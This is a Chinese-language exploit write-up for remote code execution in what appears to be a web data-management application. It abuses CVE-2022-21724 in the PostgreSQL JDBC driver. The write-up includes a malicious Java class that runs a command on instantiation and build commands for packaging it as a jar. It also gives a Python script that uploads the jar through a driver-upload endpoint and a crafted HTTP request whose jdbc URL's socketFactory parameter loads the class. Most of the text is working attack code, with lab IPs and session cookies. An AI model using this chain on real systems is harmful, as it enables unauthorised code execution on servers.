# pgsql加载恶意jar包RCE

该漏洞与驱动覆盖RCE原理类似，利用的是CVE-2022-21724，postgresql会实例化jdbcurl中传入的socketFactory参数的类名。因此上传一个恶意jar包在同级目录，实例化该恶意类致RCE

**jar包构造**

1. 创建com/test文件夹

2. test目录下创建Exploit.java

3. 编译并打包

   ```
   javac com/test/Exploit.java
   jar cvf exploit.jar com/test/Exploit.class
   ```

Exploit.java如下，注意必须是带String参数的构造函数

```java
package com.test;

import java.io.IOException;

public class Exploit {
    public Exploit(String config) {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {}
    }
}
```

上传jar包

```python
import requests

url = "http://192.168.239.1:50401/driverEntity/uploadDriverFile"

headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
        "Cookie": "Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1770000191,1770084448,1770775295,1770789903; DG_USER_ID_ANONYMOUS=3bb506ec9c1847088bc69c9f3d672bc5; DG_DETECTED_VERSION=5.5.0; DG_REMEMBER_ME=YWRtaW46MTgwMzYzMDcxOTQ5NTo0MzJmM2Q2ZjY1YWFiZDlkNmViMTU2OTM5MWNkYzQyZg; JSESSIONID=20BCFFEE1023E7E48AD8645265BBD255",
        "Connection": "keep-alive"
    }

data = {
        "id": "jdbcpostgresql42d2jre8"
    }

proxy = {'http': 'http://127.0.0.1:8080'}

target_path = "Exploit.jar"

with open(r"C:\Users\13903\Desktop\Exploit.jar", "rb") as f:
    files = {
        'file': (target_path, f, 'application/octet-stream')
    }
    response = requests.post(url, files=files, headers=headers, data=data, proxies=proxy)

print(response.text)
```

jdbcurl填入`jdbc:postgresql://127.0.0.1:5432/test?socketFactory=com.test.Exploit&socketFactoryConfig=exp`即可

```http
POST /dtbsSource/testConnection HTTP/1.1
Host: 192.168.239.1:50401
Content-Length: 478
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/json
Origin: http://192.168.239.1:50401
Referer: http://192.168.239.1:50401/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1770000191,1770084448,1770775295,1770789903; DG_USER_ID_ANONYMOUS=3bb506ec9c1847088bc69c9f3d672bc5; DG_DETECTED_VERSION=5.5.0; DG_REMEMBER_ME=YWRtaW46MTgwMzYzMDcxOTQ5NTo0MzJmM2Q2ZjY1YWFiZDlkNmViMTU2OTM5MWNkYzQyZg; JSESSIONID=6E72393CE77D3E22E48ECEAB53F0AFCC
Connection: keep-alive

{"dataPermission":-9,"properties":[],"driverEntity":{"id":"jdbcpostgresql42d2jre8","driverClassName":"org.postgresql.Driver","displayName":"postgresql-42.2.19","jreVersion":"8","databaseName":"PostgreSQL","databaseVersions":["8.2+"],"displayText":"postgresql-42.2.19","displayDescMore":"DB: PostgreSQL, Versions: [8.2+], JRE: 8"},"url":"jdbc:postgresql://127.0.0.1:5432/test?socketFactory=com.test.Exploit&socketFactoryConfig=exp","title":"test","user":"test","password":"test"}
```

